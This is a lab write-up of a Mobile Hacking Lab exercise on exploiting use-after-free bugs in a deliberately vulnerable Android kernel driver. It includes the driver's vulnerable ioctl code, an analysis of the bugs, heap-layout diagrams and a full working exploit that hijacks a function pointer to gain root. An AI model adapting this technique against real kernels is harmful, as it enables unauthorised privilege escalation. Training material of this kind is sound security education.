---
author: 0xbinder
layout: post
title: Tryout Labs - Android Kernel UAF Exploitation
date: '2025-11-20'
description: "Exploiting Use-After-Free vulnerabilities in a Linux kernel driver to achieve privilege escalation"
useRelativeCover: true
categories: [Mobile Hacking Lab]
---

![img-description](featured.png)

## Introduction

This writeup explores a vulnerable Linux kernel driver from Mobile Hacking Lab's Tryout Labs. The driver contains multiple Use-After-Free (UAF) vulnerabilities that can be exploited to achieve privilege escalation from a regular user to root.

## Lab Setup

Navigate to the installed directory and run the Android kernel using the `launch.sh` script.

```bash
Saving 2048 bits of creditable seed for next boot
Starting syslogd: OK
Starting klogd: OK
Running sysctl: OK
Starting network: OK
Starting dhcpcd...
dhcpcd-10.0.1 starting
DUID 00:01:00:01:2c:d7:7d:4d:52:54:00:12:34:56
forked to background, child pid 130
no interfaces have a carrier
Starting sshd: [    2.367362] NOHZ tick-stop error: Non-RCU local softirq work is pending, handler #10!!!
[    2.443256] NOHZ tick-stop error: Non-RCU local softirq work is pending, handler #10!!!
OK

Welcome to Buildroot
buildroot login: user
Password: 
[   86.804368] NOHZ tick-stop error: Non-RCU local softirq work is pending, handler #10!!!
$ whoami
user
$ 
```

After booting, you'll see a login screen. You can login with two accounts:

- **root:root**
- **user:user**

The vulnerable driver is accessible via `/proc/tryout` with world-readable/writable permissions (0666).

## Understanding the Driver: A Simple Test

Before diving into vulnerabilities, let's write a simple program to understand how the driver works. This will help us see what's happening under the hood.

### Basic Interaction Test

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

// Define the IOCTL commands (must match the driver)
#define CREATE_MSG _IO(1, 0)
#define CREATE_BUF _IO(1, 1)
#define READ_MSG _IO(1, 2)
#define LOG_MSG _IO(1, 3)
#define DELETE_MSG _IO(1, 4)
#define DELETE_BUF _IO(1, 5)

// Structure to communicate with the driver
struct user_req {
  unsigned int buf_id;
  unsigned int msg_id;
  char buffer[128];
};

int main() {
  // Step 1: Open the driver
  int fd = open("/proc/tryout", O_RDWR);
  if (fd < 0) {
    perror("Failed to open /proc/tryout");
    return 1;
  }
  printf("[✓] Successfully opened /proc/tryout\n");

  // Step 2: Create a message with ID 1
  struct user_req *req1 = calloc(1, sizeof(struct user_req));
  req1->msg_id = 1;

  if (ioctl(fd, CREATE_MSG, req1) == 0) {
    printf("[✓] Created message with ID: %d\n", req1->msg_id);
  } else {
    printf("[✗] Failed to create message\n");
  }

  // Step 3: Create a buffer and link it to the message
  struct user_req *req2 = calloc(1, sizeof(struct user_req));
  req2->msg_id = 1;
  req2->buf_id = 0;
  strcpy(req2->buffer, "Hello from userspace!");

  if (ioctl(fd, CREATE_BUF, req2) == 0) {
    printf("[✓] Created buffer with ID: %d and linked to message %d\n",
           req2->buf_id, req2->msg_id);
    printf("    Buffer content: \"%s\"\n", req2->buffer);
  } else {
    printf("[✗] Failed to create buffer\n");
  }

  // Step 4: Read the message buffer back
  struct user_req *req3 = calloc(1, sizeof(struct user_req));
  req3->msg_id = 1;

  if (ioctl(fd, READ_MSG, req3) == 0) {
    printf("[✓] Read message buffer successfully\n");
    printf("    Buffer content: \"%s\"\n", req3->buffer);
  } else {
    printf("[✗] Failed to read message\n");
  }

  // Step 5: Call the log function
  struct user_req *req4 = calloc(1, sizeof(struct user_req));
  req4->msg_id = 1;

  printf("[*] Calling LOG_MSG (check dmesg for kernel log)...\n");
  ioctl(fd, LOG_MSG, req4);

  // Step 6: Clean up
  struct user_req *req5 = calloc(1, sizeof(struct user_req));
  req5->buf_id = 0;

  if (ioctl(fd, DELETE_BUF, req5) == 0) {
    printf("[✓] Deleted buffer with ID: %d\n", req5->buf_id);
  }

  struct user_req *req6 = calloc(1, sizeof(struct user_req));
  req6->msg_id = 1;

  if (ioctl(fd, DELETE_MSG, req6) == 0) {
    printf("[✓] Deleted message with ID: %d\n", req6->msg_id);
  }

  // Clean up
  free(req1);
  free(req2);
  free(req3);
  free(req4);
  free(req5);
  free(req6);
  close(fd);

  return 0;
}
```


### Compile and Run

```bash
# Move the vulnerable driver to root
scp -P 10021 tryoutlab.ko root@127.0.0.1:/root

# Login and load the driver
insmod tryoutlab.ko

[   76.461555] tryoutlab: loading out-of-tree module taints kernel.
[   76.463324] tryoutlab: module license 'MobileHackingLab' taints kernel.
[   76.464009] Disabling lock debugging due to kernel taint
[   76.497581] Welcome to MobileHackingLab - Android Kernel Tryoutlab
[   76.497664] Interact with driver --> /proc/tryout

# Compile test.c
aarch64-linux-gnu-gcc -w -static test.c -o test

# Move the test binary to user
scp -P 10021 test user@127.0.0.1:/home/user

# Run test
./test
```

Our `test` code now works perfectly in the `user` space.

```bash
$ ./test
[✓] Successfully opened /proc/tryout
[   76.500975] 
[  162.240497] New message created
[✓] Created message with ID: 1
[  162.240698] 
[  162.243487] Buffer created and linked to msg
[✓] Created buffer with ID: 0 and linked to message 1
    Buffer content: "Hello from userspace!"
[  162.243591] 
[  162.244293] Msg buffer read
[✓] Read message buffer successfully
    Buffer content: "Hello from userspace!"
[*] Calling LOG_MSG (check dmesg for kernel log)...
[  162.244385] 
[  162.244984] Message is logged: 1
[  162.245050] 
[  162.245197] Buffer removed
[✓] Deleted buffer with ID: 0
[  162.245242] 
[✓] Deleted message with ID: 1
$ 
```

## Vulnerability Analysis

### Driver Overview

The vulnerable driver implements a message management system with the following IOCTL commands:

- `CREATE_MSG` - Creates a message object (kmalloc-128)

```c
case CREATE_MSG:
    if (msgs[msg_id]){
        printk(KERN_INFO "Msg with id already exist");
        return 0;
    }

    obj = kmalloc(sizeof(struct msg),GFP_KERNEL);
    obj->id = msg_id;
    obj->secret_func = priv_esc;
    obj->log_func = kernel_log;
    msgs[msg_id] = obj;
    printk(KERN_INFO "New message created");
    break;
```

- `CREATE_BUF` - Creates a buffer and links it to a message

```c
case CREATE_BUF:

    if (buffers[buf_id] || !msgs[msg_id]){
        printk(KERN_INFO "Buffer already exist or msg doesn't exist");
        return 0;
    }
        
    buf = kmalloc(sizeof(req.buffer),GFP_KERNEL);
    memcpy(buf,req.buffer,sizeof(req.buffer));
    buffers[buf_id] = buf;
    msgs[msg_id]->buffer = buf;
    
    printk(KERN_INFO "Buffer created and linked to msg");

    break;
```

- `READ_MSG` - Reads a message's buffer

```c
case READ_MSG:

    if (!msgs[msg_id]){
        printk(KERN_INFO "Msg with msg_id doesn't exist");
        return 0;
    }	
    obj = msgs[msg_id];
    memcpy(req.buffer,obj->buffer,sizeof(req.buffer));
    ret = copy_to_user((struct user_req __user*)arg,&req,sizeof(struct user_req));
    printk(KERN_INFO "Msg buffer read");

    break;
```

- `LOG_MSG` - Calls the logging function pointer

```c
case LOG_MSG:

    if (!msgs[msg_id]){
        printk(KERN_INFO "Msg with msg_id doesn't exist");
        return 0;
    }

    obj = msgs[msg_id];
    obj->log_func(obj->id);

    break;
```

- `DELETE_MSG` - Frees a message object

```c
case DELETE_MSG:

    if (!msgs[msg_id]){
        printk(KERN_INFO "Msg with msg_id doesn't exist");
        return 0;
    }
    obj = msgs[msg_id];
    kfree(obj);

    break;
```

- `DELETE_BUF` - Frees a buffer

```c
case DELETE_BUF:

    if (!buffers[buf_id])
    {	
        printk(KERN_INFO "Buffer with buf_id doesn't exist");
        return 0;
    }
    buf = buffers[buf_id];
    kfree(buf);
    buffers[buf_id] = NULL;
    printk(KERN_INFO "Buffer removed");
    break;
```

### Data Structures

The driver uses two key structures:

```c
struct user_req {
    unsigned int buf_id;
    unsigned int msg_id;
    char buffer[128];
};

struct msg {
    void (*log_func)(unsigned int);    // Function pointer at offset 0
    void (*secret_func)(void);          // priv_esc function at offset 8
    char *buffer;                       // Buffer pointer at offset 16
    unsigned int id;                    // Message ID at offset 24
    char pad[96];                       // Padding to 128 bytes
};
```

### Critical Vulnerabilities

#### 1. Use-After-Free in DELETE_BUF

When `DELETE_BUF` is called, the buffer is freed and only one of the references to it is cleared:

```c
case DELETE_BUF:

    if (!buffers[buf_id])
    {	
        printk(KERN_INFO "Buffer with buf_id doesn't exist");
        return 0;
    }
    buf = buffers[buf_id];
    kfree(buf);
    buffers[buf_id] = NULL; // Only clears the global buffers[] entry
    // BUG: msgs[msg_id]->buffer still points to freed memory!
```
During creation, the buffer is assigned to two pointers:

```c
memcpy(buf, req.buffer, sizeof(req.buffer));
buffers[buf_id] = buf;
msgs[msg_id]->buffer = buf;   // Message object also stores the pointer
```

Both `buffers[buf_id]` and `msgs[msg_id]->buffer` reference the same allocated buffer, so both must be cleared when it’s freed. However, the code only NULLs `buffers[buf_id]`, leaving `msgs[msg_id]->buffer` pointing to freed memory and creating a UAF.

#### 2. Use-After-Free in DELETE_MSG

When `DELETE_MSG` is called, the message object is freed but only one of the references is handled:

```c
case DELETE_MSG:

    if (!msgs[msg_id]){
        printk(KERN_INFO "Msg with msg_id doesn't exist");
        return 0;
    }
    obj = msgs[msg_id];
    kfree(obj);
    // BUG: msgs[msg_id] still points to freed memory!
```

The global `msgs[]` array entry still points to the freed memory, allowing subsequent operations on the freed object.

#### 3. Missing Bounds Check

The bounds check is ineffective:
```c
if (req.msg_id > MAX || req.buf_id > MAX) {
    printk(KERN_INFO "Incorrect msg_id or buf_id");
    // BUG: Function continues execution!
}
```

The function doesn't return after detecting invalid IDs, making the check useless.

## Exploitation Strategy

The exploit uses a clever technique called "heap feng shui" - carefully arranging memory allocations and frees to control what data ends up where in kernel memory. Our goal is simple but powerful:

1. **Phase 1: Information Leak** - Discover where the `priv_esc()` function lives in kernel memory
2. **Phase 2: Memory Corruption** - Place that address where we want it
3. **Phase 3: Privilege Escalation** - Trick the kernel into calling our function

### Let's Break Down What Happens

#### Step 1 & 2: Create and Free (Setting the Trap)
```
After CREATE_MSG (id=69):
┌────────────────────────────────────────────────┐
│ Kernel Memory Slot #X (kmalloc-128):           │
│                                                │
│ msgs[69] ──► [Message Object]                  │
│              ┌────────────┬──────────────┐     │
│              │ log_func   │ secret_func  │     │
│              │ (kernel_   │ (priv_esc)   │     │
│              │  log addr) │  addr)       │     │
│              └────────────┴──────────────┘     │
└────────────────────────────────────────────────┘

After DELETE_MSG:
┌────────────────────────────────────────────────┐
│ Kernel Memory Slot #X (kmalloc-128):           │
│                                                │
│ msgs[69] ──► [FREED MEMORY]                    │
│              ┌────────────┬──────────────┐     │
│              │ ????????   │ ????????     │     │
│              │ (garbage)  │ (garbage)    │     │
│              └────────────┴──────────────┘     │
│                                                │
│    BUG: msgs[69] still points here!            │
└────────────────────────────────────────────────┘
```

#### Step 3: Finding priv_esc Address

We need to know where `priv_esc()` lives in memory. We can find it using:
```bash
$ cat /proc/kallsyms | grep "priv_esc"
ffff800008e50000 t priv_esc	[tryoutlab]
```

This address `ffff800008e50000` is our golden ticket! In little-endian format (how ARM64 stores multi-byte values):
```
Address: 0xffff800008e50000

Byte-by-byte breakdown:
┌────┬────┬────┬────┬────┬────┬────┬────┐
│ 00 │ 00 │ e5 │ 08 │ 00 │ 80 │ ff │ ff │  (Little-endian)
└────┴────┴────┴────┴────┴────┴────┴────┘
  ^                                    ^
  Least significant byte              Most significant byte
```

#### Step 4: The Memory Swap (The Magic Trick)
```c
// We create a buffer with our payload
uint8_t payload[8] = {0x00, 0x00, 0xe5, 0x08, 0x00, 0x80, 0xff, 0xff};
memcpy(request->buffer, payload, sizeof(payload));
ioctl(fd, CREATE_BUF, request);
```

What happens in kernel memory:
```
Before CREATE_BUF:
┌────────────────────────────────────────────────┐
│ Slot #X: [FREED - available]                   │
│          ┌────────────┬──────────────┐         │
│          │ ????????   │ ????????     │         │
│          └────────────┴──────────────┘         │
│                                                │
│ msgs[69] still points here (dangling!)         │
└────────────────────────────────────────────────┘

After CREATE_BUF:
┌────────────────────────────────────────────────┐
│ Slot #X: [Buffer Data - but msgs[69] thinks    │
│           this is still a message object!]     │
│          ┌────────────┬──────────────┐         │
│          │ 0xffff8000 │ "rest of     │         │
│          │ 08e50000   │  buffer..."  │         │
│          └────────────┴──────────────┘         │
│              ▲                                 │
│              │                                 │
│              └─ This will be read as log_func! │
│                                                │
│ msgs[69] ──► Points here                       │
│ buffers[69] ──► Points here too                │
└────────────────────────────────────────────────┘
```

**The Confusion**: 
- The kernel's buffer system thinks this is buffer data
- But `msgs[69]` thinks this is still a message object!
- The first 8 bytes of our buffer will be interpreted as the `log_func` pointer

#### Step 5: Hijacking Execution (Game Over)
```c
printf("uid: %d\n", getuid());     // UID: 1000 (regular user)
ioctl(fd, LOG_MSG, request);       // Trigger the exploit!
printf("uid: %d\n", getuid());     // UID: 0 (root!)
```

What the kernel does when LOG_MSG is called:
```
Kernel's execution flow:
┌─────────────────────────────────────────────┐
│ 1. Get message: obj = msgs[69]              │
│                       ↓                     │
│    Points to our buffer data!               │
└─────────────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────┐
│ 2. Read function pointer:                   │
│    func_ptr = obj->log_func                 │
│             = first 8 bytes of buffer       │
│             = 0xffff800008e50000            │
│             = ADDRESS OF priv_esc()!        │
└─────────────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────┐
│ 3. Call the function:                       │
│    func_ptr(obj->id);                       │
│    ↓                                        │
│    Jumps to priv_esc() instead of           │
│    kernel_log()!                            │
└─────────────────────────────────────────────┘
                     ↓
┌─────────────────────────────────────────────┐
│ 4. priv_esc() executes:                     │
│    commit_creds(prepare_kernel_cred(NULL))  │
│    ↓                                        │
│    Our process becomes ROOT!                │
└─────────────────────────────────────────────┘
```

Full `exploit.c` code 

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CREATE_MSG _IO(1, 0)
#define CREATE_BUF _IO(1, 1)
#define READ_MSG _IO(1, 2)
#define LOG_MSG _IO(1, 3)
#define DELETE_MSG _IO(1, 4)
#define DELETE_BUF _IO(1, 5)

struct user_req {
  unsigned int buf_id;
  unsigned int msg_id;
  char buffer[128];
};

int main() {

  char *driver = "/proc/tryout";
  int fd = open(driver, O_RDWR);
  struct user_req *request = malloc(sizeof(struct user_req));

  memset(request, 0, sizeof(struct user_req));
  request->msg_id = 69;
  request->buf_id = 69;
  ioctl(fd, CREATE_MSG, request);
  ioctl(fd, DELETE_MSG, request);

  memset(request->buffer, 0x0, sizeof(request->buffer));
  uint8_t payload[8] = {0x00, 0x00, 0xe5, 0x08,
                        0x00, 0x80, 0xff, 0xff}; // address of priv_esc function
  memcpy(request->buffer, payload, sizeof(payload));

  printf("uid: %d\n", getuid());
  ioctl(fd, CREATE_BUF, request);
  ioctl(fd, LOG_MSG, request);
  printf("uid: %d\n", getuid());
  system("/bin/busybox sh");
  close(fd);
  return 0;
}
```

```c
# compile the exploit
aarch64-linux-gnu-gcc -w -static exploit.c -o exploit

# move the binary to Android user 
scp -P 10021 exploit user@127.0.0.1:/home/user
```

We run the exploit and we are now root

```bash
$ ./exploit
[   48.187300] New message created
[   48.187356] 
uid: 1000
[   48.187694] 
[   48.192920] Buffer created and linked to msg
[   48.193692] 
uid: 0
$ whoami
root
$ 
```